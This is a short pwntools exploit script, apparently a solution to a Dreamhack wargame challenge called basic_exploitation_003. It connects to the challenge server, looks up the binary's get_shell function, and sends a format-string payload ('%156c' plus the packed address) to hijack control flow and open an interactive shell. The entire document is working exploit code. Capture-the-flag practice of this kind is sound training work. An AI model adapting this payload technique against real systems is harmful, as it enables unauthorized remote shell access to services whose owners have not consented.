from pwn import *

p = remote("host1.dreamhack.games", 19475)

elf = ELF("./basic_exploitation_003")
get_shell = elf.symbols['get_shell']

pay = "%156c"
pay += p32(get_shell)

p.send(pay)
p.interactive()